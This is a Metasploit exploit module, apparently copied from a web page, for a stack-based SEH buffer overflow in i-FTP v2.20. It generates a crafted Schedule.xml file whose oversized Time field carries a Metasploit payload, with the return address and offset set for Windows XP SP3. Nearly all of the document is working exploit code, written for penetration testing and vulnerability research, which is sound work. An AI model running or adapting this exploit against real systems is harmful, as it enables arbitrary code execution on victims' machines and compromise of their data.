# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;rexml/document&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh
  include REXML
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;i-FTP Schedule Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack-based buffer overflow vulnerability in
        i-Ftp v2.20, caused by a long time value set for scheduled download.
        By persuading the victim to place a specially-crafted Schedule.xml file
        in the i-FTP folder, a remote attacker could execute arbitrary code on
        the system or cause the application to crash. This module has been
        tested successfully on Windows XP SP3.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;metacom&#039;,      # Vulnerability discovery and PoC
          &#039;Gabor Seljan&#039;  # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;35177&#039; ],
          [ &#039;OSVDB&#039;, &#039;114279&#039; ],
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;ExitFunction&#039; => &#039;process&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;   => "\x00\x0a\x0d\x20\x22",
          &#039;Space&#039;      => 2000
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows XP SP3&#039;,
            {
              &#039;Offset&#039; => 600,
              &#039;Ret&#039;    => 0x1001eade  # POP ECX # POP ECX # RET [Lgi.dll]
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Nov 06 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
        [
          OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;Schedule.xml&#039;])
        ],
      self.class)
 
  end
 
  def exploit
 
    evil =  rand_text_alpha(target[&#039;Offset&#039;])
    evil << generate_seh_payload(target.ret)
    evil << rand_text_alpha(20000)
 
    xml = Document.new
    xml << XMLDecl.new(&#039;1.0&#039;, &#039;UTF-8&#039;)
    xml.add_element(&#039;Schedule&#039;, {})
    xml.elements[1].add_element(
      &#039;Event&#039;,
      {
        &#039;Url&#039; => &#039;&#039;,
        &#039;Time&#039; => &#039;EVIL&#039;,
        &#039;Folder&#039; => &#039;&#039;
      })
 
    sploit = &#039;&#039;
    xml.write(sploit, 2)
    sploit = sploit.gsub(/EVIL/, evil)
 
    # Create the file
    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    file_create(sploit)
 
  end
end

